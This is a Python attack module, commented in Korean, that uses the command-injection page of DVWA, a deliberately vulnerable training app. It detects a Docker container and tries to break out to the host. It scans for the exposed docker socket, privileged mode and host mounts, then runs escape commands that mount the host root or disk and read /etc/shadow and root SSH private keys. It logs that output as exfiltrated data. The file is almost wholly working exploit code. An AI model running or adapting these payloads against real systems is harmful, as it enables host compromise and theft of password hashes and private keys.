"""
Docker Container Escape Module
Docker 컨테이너 탈출 및 호스트 시스템 권한 획득 모듈
"""

import time
import re
from utils.logger import log_attack, log_command_output, log_exfiltrated_data

# Docker 탈출 벡터 확인
DOCKER_ESCAPE_CHECKS = {
    'container_detection': [
        # Docker 컨테이너인지 확인
        'cat /proc/1/cgroup | grep docker',
        'ls -la /.dockerenv',
        'cat /proc/self/mountinfo | grep docker',
    ],
    'docker_socket': [
        # Docker 소켓 접근 가능 여부 (매우 위험!)
        'ls -la /var/run/docker.sock',
        'test -S /var/run/docker.sock && echo "SOCKET_ACCESSIBLE"',
    ],
    'privileged_container': [
        # Privileged 모드 확인
        'cat /proc/self/status | grep CapEff',
        'capsh --print | grep Current',
        'fdisk -l 2>/dev/null | head -20',
    ],
    'host_filesystem': [
        # 호스트 파일시스템 마운트 확인
        'mount | grep /host',
        'mount | grep /proc/sys',
        'df -h | grep /host',
    ],
    'namespace_escape': [
        # Namespace 탈출 가능성 확인
        'cat /proc/self/status | grep NSpid',
        'ls -la /proc/1/ns/',
    ],
}

# Docker 탈출 기법
DOCKER_ESCAPE_TECHNIQUES = [
    {
        'name': 'Docker Socket Exploitation',
        'description': 'Docker 소켓을 통한 컨테이너 생성 및 호스트 접근',
        'check_command': 'test -S /var/run/docker.sock && echo "YES"',
        'exploit_commands': [
            # Docker 클라이언트 설치 확인
            'which docker',
            # 호스트 루트를 마운트한 특권 컨테이너 생성
            'docker run -v /:/host -it alpine chroot /host /bin/bash -c "cat /etc/shadow"',
            'docker run -v /:/host -it alpine chroot /host /bin/bash -c "cat /root/.ssh/id_rsa"',
        ],
    },
    {
        'name': 'Privileged Container Breakout',
        'description': 'Privileged 모드 컨테이너에서 호스트 접근',
        'check_command': 'fdisk -l 2>/dev/null | grep -q /dev/ && echo "YES"',
        'exploit_commands': [
            # 호스트 디스크 마운트 시도
            'mkdir -p /tmp/hostfs 2>/dev/null',
            'mount /dev/sda1 /tmp/hostfs 2>/dev/null && echo "MOUNTED"',
            'ls -la /tmp/hostfs/root 2>/dev/null',
            'cat /tmp/hostfs/etc/shadow 2>/dev/null | head -5',
        ],
    },
    {
        'name': 'Exposed Docker API',
        'description': 'Docker API를 통한 원격 명령 실행',
        'check_command': 'curl -s --unix-socket /var/run/docker.sock http://localhost/version 2>/dev/null | grep -q ApiVersion && echo "YES"',
        'exploit_commands': [
            'curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json',
            'curl -s --unix-socket /var/run/docker.sock http://localhost/images/json',
        ],
    },
    {
        'name': 'Host Filesystem Access',
        'description': '마운트된 호스트 파일시스템을 통한 접근',
        'check_command': 'mount | grep -q "/host" && echo "YES"',
        'exploit_commands': [
            'ls -la /host',
            'cat /host/etc/shadow 2>/dev/null | head -5',
            'cat /host/root/.ssh/id_rsa 2>/dev/null',
        ],
    },
]

def run_attack(session, delay=1):
    """
    Docker 컨테이너 탈출 공격 실행

    Args:
        session: DVWA 세션 객체
        delay: 요청 간 지연 시간(초)

    Returns:
        dict: 공격 결과 통계
    """
    results = {
        'success': False,
        'attempts': 0,
        'successful': 0,
        'findings': {
            'is_container': False,
            'escape_vectors': {},
            'escaped': False,
            'host_access': []
        }
    }

    print("\n  [*] ===========================================")
    print("  [*] Docker 컨테이너 탈출 및 호스트 권한 획득")
    print("  [*] ===========================================\n")

    cmdi_url = f"{session.base_url}/vulnerabilities/exec/"

    # 1단계: Docker 컨테이너 확인
    print("  [1/3] Docker 컨테이너 여부 확인 중...")
    if not check_docker_container(session, cmdi_url, results, delay):
        print("    [-] Docker 컨테이너가 아닙니다. 탈출 불가능")
        return results

    print("    [!] Docker 컨테이너 감지! 탈출 시도 시작...")
    results['findings']['is_container'] = True

    # 2단계: 탈출 벡터 스캔
    print("\n  [2/3] Docker 탈출 벡터 스캔 중...")
    scan_escape_vectors(session, cmdi_url, results, delay)

    # 3단계: 실제 탈출 시도
    print("\n  [3/3] Docker 탈출 시도 중...")
    attempt_container_escape(session, cmdi_url, results, delay)

    if results['successful'] > 0:
        results['success'] = True

    print_docker_escape_summary(results)
    return results

def check_docker_container(session, cmdi_url, results, delay):
    """Docker 컨테이너 여부 확인"""

    check_commands = [
        'cat /proc/1/cgroup | grep docker',
        'ls -la /.dockerenv',
    ]

    for cmd in check_commands:
        results['attempts'] += 1

        try:
            payload = f"127.0.0.1; {cmd}"
            data = {'ip': payload, 'Submit': 'Submit'}
            response = session.session.post(cmdi_url, data=data)
            output = extract_command_output(response.text)

            if output and len(output) > 5:
                results['successful'] += 1
                log_attack(
                    'DOCKER_DETECTION',
                    'SUCCESS',
                    f"Container detected: {cmd}",
                    response.status_code,
                    len(response.text)
                )
                return True

            time.sleep(delay)

        except Exception as e:
            log_attack('DOCKER_DETECTION', 'ERROR', f"Error: {str(e)}", 0, 0)

    return False

def scan_escape_vectors(session, cmdi_url, results, delay):
    """Docker 탈출 벡터 스캔"""

    for category, commands in DOCKER_ESCAPE_CHECKS.items():
        print(f"    [*] {category} 확인 중...")
        category_findings = []

        for cmd in commands:
            results['attempts'] += 1

            try:
                payload = f"127.0.0.1; {cmd}"
                data = {'ip': payload, 'Submit': 'Submit'}
                response = session.session.post(cmdi_url, data=data)
                output = extract_command_output(response.text)

                if output and len(output) > 5:
                    results['successful'] += 1
                    category_findings.append({
                        'command': cmd,
                        'output': output
                    })

                    log_command_output(cmd, category, output, preview_lines=20)
                    log_attack(
                        'DOCKER_ESCAPE_VECTOR',
                        'SUCCESS',
                        f"Category: {category}, Command: {cmd}",
                        response.status_code,
                        len(response.text)
                    )

                    # 중요 발견 사항 표시
                    if 'SOCKET_ACCESSIBLE' in output:
                        print(f"      [!!!] Docker 소켓 접근 가능! (매우 위험)")
                    elif 'docker' in output.lower():
                        print(f"      [+] Docker 환경 확인: {output[:50]}...")
                    elif '/dev/sd' in output or '/dev/xvd' in output:
                        print(f"      [!] 호스트 디스크 접근 가능!")
                    elif '/host' in output:
                        print(f"      [!] 호스트 파일시스템 마운트됨!")
                    else:
                        print(f"      [+] {cmd[:60]}")

                time.sleep(delay)

            except Exception as e:
                log_attack('DOCKER_ESCAPE_VECTOR', 'ERROR', f"Command: {cmd}, Error: {str(e)}", 0, 0)

        if category_findings:
            results['findings']['escape_vectors'][category] = category_findings

def attempt_container_escape(session, cmdi_url, results, delay):
    """Docker 컨테이너 탈출 시도"""

    for technique in DOCKER_ESCAPE_TECHNIQUES:
        results['attempts'] += 1

        try:
            print(f"\n    [*] {technique['name']} 시도 중...")
            print(f"        {technique['description']}")

            # 탈출 기법 적용 가능 여부 확인
            check_payload = f"127.0.0.1; {technique['check_command']}"
            check_data = {'ip': check_payload, 'Submit': 'Submit'}
            check_response = session.session.post(cmdi_url, data=check_data)
            check_output = extract_command_output(check_response.text)

            if 'YES' not in check_output and 'MOUNTED' not in check_output:
                print(f"        [-] 이 기법은 적용 불가능")
                time.sleep(delay)
                continue

            print(f"        [+] 적용 가능! 탈출 시도 중...")
            results['successful'] += 1

            # 탈출 명령 실행
            for exploit_cmd in technique['exploit_commands']:
                results['attempts'] += 1

                payload = f"127.0.0.1; {exploit_cmd}"
                data = {'ip': payload, 'Submit': 'Submit'}
                response = session.session.post(cmdi_url, data=data)
                output = extract_command_output(response.text)

                if output and len(output) > 10:
                    results['successful'] += 1
                    results['findings']['host_access'].append({
                        'technique': technique['name'],
                        'command': exploit_cmd,
                        'output': output
                    })

                    # 호스트 데이터 탈취 로그 기록
                    log_exfiltrated_data(
                        f"Docker Escape - {technique['name']}",
                        exploit_cmd,
                        output,
                        preview_length=1000
                    )

                    log_attack(
                        'DOCKER_ESCAPE_SUCCESS',
                        'SUCCESS',
                        f"Technique: {technique['name']}, Command: {exploit_cmd}",
                        response.status_code,
                        len(response.text)
                    )

                    # 민감한 데이터 발견 시 표시
                    if 'root:' in output or '$6$' in output:
                        print(f"        [!!!] 호스트 /etc/shadow 접근 성공! ({len(output)} bytes)")
                        results['findings']['escaped'] = True
                    elif 'BEGIN RSA PRIVATE KEY' in output or 'BEGIN OPENSSH PRIVATE KEY' in output:
                        print(f"        [!!!] SSH 프라이빗 키 탈취 성공!")
                        results['findings']['escaped'] = True
                    elif len(output) > 50:
                        print(f"        [+] 데이터 수집: {len(output)} bytes")

                time.sleep(delay)

        except Exception as e:
            log_attack('DOCKER_ESCAPE_ATTEMPT', 'ERROR', f"Technique: {technique['name']}, Error: {str(e)}", 0, 0)

def extract_command_output(html_response):
    """HTML 응답에서 명령어 출력 추출"""
    try:
        # <pre> 태그에서 추출
        pre_match = re.search(r'<pre>(.*?)</pre>', html_response, re.DOTALL | re.IGNORECASE)
        if pre_match:
            output = pre_match.group(1)
        else:
            textarea_match = re.search(r'<textarea[^>]*>(.*?)</textarea>', html_response, re.DOTALL | re.IGNORECASE)
            if textarea_match:
                output = textarea_match.group(1)
            else:
                return ""

        # HTML 엔티티 디코딩
        output = output.replace('&lt;', '<').replace('&gt;', '>').replace('&amp;', '&')
        output = output.replace('&quot;', '"').replace('&#039;', "'")

        # ping 결과 완전 제거
        lines = output.split('\n')
        filtered_lines = []
        in_ping_section = False

        for line in lines:
            if 'PING 127.0.0.1' in line:
                in_ping_section = True
                continue
            if in_ping_section:
                if 'bytes from 127.0.0.1' in line:
                    continue
                if '127.0.0.1 ping statistics' in line:
                    continue
                if 'packets transmitted' in line:
                    continue
                if 'round-trip' in line or 'rtt min' in line:
                    continue
                if line.startswith('---'):
                    continue
                if not line.strip():
                    continue
                in_ping_section = False
            if line.strip():
                filtered_lines.append(line)

        return '\n'.join(filtered_lines).strip()
    except Exception:
        return ""

def print_docker_escape_summary(results):
    """Docker 탈출 결과 요약 출력"""
    print("\n  [*] ===========================================")
    print("  [*] Docker 컨테이너 탈출 결과 요약")
    print("  [*] ===========================================\n")

    print(f"  총 시도: {results['attempts']}회")
    print(f"  성공: {results['successful']}회\n")

    findings = results['findings']

    if findings['is_container']:
        print(f"  [+] Docker 컨테이너: 확인됨")

        if findings['escape_vectors']:
            print(f"\n  [+] 발견된 탈출 벡터:")
            for vector, data in findings['escape_vectors'].items():
                print(f"      - {vector}: {len(data)}개 발견")

        if findings['escaped']:
            print(f"\n  [!!!] 컨테이너 탈출: 성공! (호스트 접근 획득)")
            print(f"  [!!!] 호스트 시스템 데이터 탈취 성공!")
        elif findings['host_access']:
            print(f"\n  [+] 호스트 시스템 접근: {len(findings['host_access'])}개 방법 발견")
        else:
            print(f"\n  [-] 컨테이너 탈출: 실패")
    else:
        print(f"  [-] Docker 컨테이너 아님")

    print()
